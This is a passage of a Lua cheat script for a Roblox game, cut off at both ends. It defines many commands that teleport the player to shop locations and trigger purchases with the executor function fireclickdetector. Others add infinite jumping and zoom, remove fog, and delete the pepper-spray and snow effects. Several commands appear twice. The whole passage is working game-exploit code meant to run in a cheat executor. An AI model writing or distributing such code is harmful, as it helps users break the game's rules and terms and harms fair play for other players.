			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '5 [RPG Ammo] - $1000' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(118.664856, -29.6487694, -272.349792, -1, 0.000172614207, -8.63816167e-05, 0.000172673812, 0.999999762, -0.000690568588, 8.62623929e-05, -0.000690583489, -0.999999762)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("5 [RPG Ammo] - $1000") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["5 [RPG Ammo] - $1000"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "flameammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '140 [Flamethrower Ammo] - $1550' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-150.322266, 50.9075279, -105.331444, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("140 [Flamethrower Ammo] - $1550") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["140 [Flamethrower Ammo] - $1550"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "revammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '12 [Revolver Ammo] - $75' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-618.600037, 18.8513641, -97.75, -1, 0, 0, 0, 1, 0, 0, 0, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("12 [Revolver Ammo] - $75") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["12 [Revolver Ammo] - $75"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "ak47ammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '90 [AK47 Ammo] - $80' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-587.529358, 5.39480686, -753.717712, -1, 0, 0, 0, 1, 0, 0, 0, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("90 [AK47 Ammo] - $80") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["90 [AK47 Ammo] - $80"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "shovel";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(147.299988, 18.8493252, 31.7999744, 0, 0, 1, 0.00036623326, 0.99999994, 0, -0.999999881, 0.00036623326, 0)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Shovel] - $320'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Shovel] - $320'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "barrelammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '18 [Double-Barrel SG Ammo] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-1046.20032, 18.8513641, -256.449951, -1, 0, 0, 0, 1, 0, 0, 0, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("18 [Double-Barrel SG Ammo] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["18 [Double-Barrel SG Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "avatar";
		["Function"] = function()
			local function inTable(What, Table)
				for Index, Value in pairs(Table) do
					if What == Value then
						return true
					end
				end
				return false
			end

			local removingClasses = {
				"Accessory",
				"Pants",
				"Shirt",
			}

			for _, Instance in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
				if inTable(Instance.ClassName, removingClasses) or Instance.Name == "face" then
					Instance:Destroy()
				end
			end
		end;
	});

	local infinitezoom = false
	addCommand({
		["Name"] = "zoom";
		["Function"] = function()
			if infinitezoom == true then
				infinitezoom = false
				game.Players.LocalPlayer.CameraMaxZoomDistance = 20
				sendNotif("", "Infinite Zoom Disabled.", 15);
			else 
				infinitezoom = true
				game.Players.LocalPlayer.CameraMaxZoomDistance = math.huge
				sendNotif("", "Infinite Zoom Enabled.", 15);
			end
		end;
	});

	addCommand({
		["Name"] = "infinitezoom";
		["Function"] = function()
			if infinitezoom == true then
				infinitezoom = false
				game.Players.LocalPlayer.CameraMaxZoomDistance = 20
				sendNotif("", "Infinite Zoom Disabled.", 15);
			else 
				infinitezoom = true
				game.Players.LocalPlayer.CameraMaxZoomDistance = math.huge
				sendNotif("", "Infinite Zoom Enabled.", 15);
			end
		end;
	});

	addCommand({
		["Name"] = "superzoom";
		["Function"] = function()
			if infinitezoom == true then
				infinitezoom = false
				game.Players.LocalPlayer.CameraMaxZoomDistance = 20
				sendNotif("", "Infinite Zoom Disabled.", 15);
			else 
				infinitezoom = true
				game.Players.LocalPlayer.CameraMaxZoomDistance = math.huge
				sendNotif("", "Infinite Zoom Enabled.", 15);
			end
		end;
	});

	local fog = false
	addCommand({
		["Name"] = "fog";
		["Function"] = function()
			if fog == true then
				fog = false
				game.Lighting.FogEnd = 550
				sendNotif("", "Fog Disabled.", 15);
			else 
				fog = true
				game.Lighting.FogEnd = math.huge
				sendNotif("", "Fog Enabled.", 15);
			end
		end;
	});

	addCommand({
		["Name"] = "togglefog";
		["Function"] = function()
			if fog == true then
				fog = false
				game.Lighting.FogEnd = 550
				sendNotif("", "Fog Disabled.", 15);
			else 
				fog = true
				game.Lighting.FogEnd = math.huge
				sendNotif("", "Fog Enabled.", 15);
			end
		end;
	});

	addCommand({
		["Name"] = "antipepper";
		["Function"] = function()
			game:GetService("StarterGui").MainScreenGui.PepperSpray:Destroy()
			game:GetService("Lighting").PepperSprayBlur:Destroy()
		end;
	});

	addCommand({
		["Name"] = "antisnow";
		["Function"] = function()
			sendOutput(" Antisnow Enabled.");
			game:GetService("StarterGui").MainScreenGui.SNOWBALLFRAME:Destroy()
			game:GetService("Lighting").SnowBlur:Destroy()
		end;
	});

	addCommand({
		["Name"] = "antiflakes";
		["Function"] = function()
			sendOutput(" Antiflakes Enabled.");
			game:GetService("Workspace").Ignored.SnowBlock:Destroy()
		end;
	});

	addCommand({
		["Name"] = "infjump";
		["Function"] = function()
			Player = game:GetService"Players".LocalPlayer;
			UIS = game:GetService'UserInputService';

			_G.JumpHeight = 50;

			function Action(Object, Function)
				if Object ~= nil then
					Function(Object);
				end
			end

			UIS.InputBegan:connect(function(UserInput)
				if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.Space then
					Action(Player.Character.Humanoid, function(self)
						if self:GetState() == Enum.HumanoidStateType.Jumping or self:GetState() == Enum.HumanoidStateType.Freefall then
							Action(self.Parent.HumanoidRootPart, function(self)
								self.Velocity = Vector3.new(0, _G.JumpHeight, 0);
							end)
						end
					end)
				end
			end)
		end;
	});


	addCommand({
		["Name"] = "orangephone";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-104.095627, 21.9084187, -855.717834)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Orange Phone] - $400'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Orange Phone] - $400'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "pinkphone";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-115.942665, 21.9033699, -859.392029)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[PinkPhone] - $400'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[PinkPhone] - $400'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "iphoneg";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-116.25132, 21.9032345, -871.106567)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[iPhoneG] - $600'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[iPhoneG] - $600'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "iphoneb";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-116.24559, 21.9032383, -876.303711)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[iPhoneB] - $600'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[iPhoneB] - $600'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "iphone";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-116.201302, 21.9032574, -881.808105)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[iPhone] - $600'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[iPhone] - $600'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "arammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '100 [AR Ammo] - $75' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-592.224243, 5.45597506, -751.531738, 0, 0, 1, 0, 1, -0, -1, 0, 0)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("100 [AR Ammo] - $75") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["100 [AR Ammo] - $75"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "smgammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '80 [SMG Ammo] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-582.523499, 5.47780275, -717.231323, -1, 0, 0, 0, 1, 0, 0, 0, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("80 [SMG Ammo] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["80 [SMG Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "silencerammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '25 [Silencer Ammo] - $50' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(500.477814, 45.1070747, -617.031189, 0.999999821, 0.000604254019, -2.60802135e-08, -0.000604254019, 0.999999821, -8.63220048e-05, -2.60802135e-08, 8.63220048e-05, 1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("25 [Silencer Ammo] - $50") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["25 [Silencer Ammo] - $50"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "glockammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '25 [Glock Ammo] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(501.277649, 45.1075287, -626.03125, -0.999999762, 0.000690576038, 2.98059604e-08, 0.000690576038, 0.999999762, 8.63220048e-05, 2.98059604e-08, 8.63220048e-05, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("25 [Glock Ammo] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["25 [Glock Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "tacticalammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '20 [TacticalShotgun Ammo] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(492.877716, 45.1125259, -620.431091, 0.999999821, 0.000604254019, -2.60802135e-08, -0.000604254019, 0.999999821, -8.63220048e-05, -2.60802135e-08, 8.63220048e-05, 1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("20 [TacticalShotgun Ammo] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["20 [TacticalShotgun Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "tacticalshotgunammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '20 [TacticalShotgun Ammo] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(492.877716, 45.1125259, -620.431091, 0.999999821, 0.000604254019, -2.60802135e-08, -0.000604254019, 0.999999821, -8.63220048e-05, -2.60802135e-08, 8.63220048e-05, 1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("20 [TacticalShotgun Ammo] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["20 [TacticalShotgun Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "tacticalshottyammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '20 [TacticalShotgun Ammo] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(492.877716, 45.1125259, -620.431091, 0.999999821, 0.000604254019, -2.60802135e-08, -0.000604254019, 0.999999821, -8.63220048e-05, -2.60802135e-08, 8.63220048e-05, 1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("20 [TacticalShotgun Ammo] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["20 [TacticalShotgun Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "p90ammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '120 [P90 Ammo] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(462.977386, 45.1329269, -624.530518, 1.1920929e-07, 0.000671427639, 0.999999762, 0.000183116586, 0.999999762, -0.000671427639, -1, 0.000183116645, 0)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("120 [P90 Ammo] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["120 [P90 Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "augammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '90 [AUG Ammo] - $80' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-278.032684, 49.3650932, -213.393814, -0.999999762, -0.000604254019, 2.60802135e-08, -0.000604254019, 0.999999821, -8.63220048e-05, 2.60802135e-08, -8.63220048e-05, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("90 [AUG Ammo] - $80") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["90 [AUG Ammo] - $80"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "shotgunammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[20 [Shotgun Ammo] - $60]' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-800.960022, -42.5478363, -931.500061, 5.96046448e-08, 0.000122077763, 1, -0.000610388757, 0.999999821, -0.000122077705, -0.999999762, -0.000610388757, 1.1920929e-07)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[20 [Shotgun Ammo] - $60]") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["20 [Shotgun Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
			end
		end;
	});

	addCommand({
		["Name"] = "shottyammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[20 [Shotgun Ammo] - $60]' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-800.960022, -42.5478363, -931.500061, 5.96046448e-08, 0.000122077763, 1, -0.000610388757, 0.999999821, -0.000122077705, -0.999999762, -0.000610388757, 1.1920929e-07)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[20 [Shotgun Ammo] - $60]") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["20 [Shotgun Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
			end
		end;
	});

	addCommand({
		["Name"] = "rpgammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '5 [RPG Ammo] - $1000' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(118.664856, -29.6487694, -272.349792, -1, 0.000172614207, -8.63816167e-05, 0.000172673812, 0.999999762, -0.000690568588, 8.62623929e-05, -0.000690583489, -0.999999762)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("5 [RPG Ammo] - $1000") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["5 [RPG Ammo] - $1000"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "flameammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '140 [Flamethrower Ammo] - $1550' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-150.322266, 50.9075279, -105.331444, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("140 [Flamethrower Ammo] - $1550") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["140 [Flamethrower Ammo] - $1550"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "revammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '12 [Revolver Ammo] - $75' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-618.600037, 18.8513641, -97.75, -1, 0, 0, 0, 1, 0, 0, 0, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("12 [Revolver Ammo] - $75") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["12 [Revolver Ammo] - $75"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "ak47ammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '90 [AK47 Ammo] - $80' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-587.529358, 5.39480686, -753.717712, -1, 0, 0, 0, 1, 0, 0, 0, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("90 [AK47 Ammo] - $80") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["90 [AK47 Ammo] - $80"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "shovel";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(147.299988, 18.8493252, 31.7999744, 0, 0, 1, 0.00036623326, 0.99999994, 0, -0.999999881, 0.00036623326, 0)
			wait(.5)

